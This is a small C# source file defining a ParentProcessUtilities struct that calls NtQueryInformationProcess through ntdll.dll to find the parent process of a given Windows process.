using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Orcus.Utilities;

public struct ParentProcessUtilities
{
	internal IntPtr Reserved1;

	internal IntPtr PebBaseAddress;

	internal IntPtr Reserved2_0;

	internal IntPtr Reserved2_1;

	internal IntPtr UniqueProcessId;

	internal IntPtr InheritedFromUniqueProcessId;

	[DllImport("ntdll.dll")]
	private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);

	public static Process GetParentProcess()
	{
		return GetParentProcess(Process.GetCurrentProcess().Handle);
	}

	public static Process GetParentProcess(int id)
	{
		return GetParentProcess(Process.GetProcessById(id).Handle);
	}

	public static Process GetParentProcess(IntPtr handle)
	{
		ParentProcessUtilities processInformation = default(ParentProcessUtilities);
		if (NtQueryInformationProcess(handle, 0, ref processInformation, Marshal.SizeOf((object)processInformation), out var _) != 0)
		{
			return null;
		}
		try
		{
			return Process.GetProcessById(processInformation.InheritedFromUniqueProcessId.ToInt32());
		}
		catch (ArgumentException)
		{
			return null;
		}
	}
}
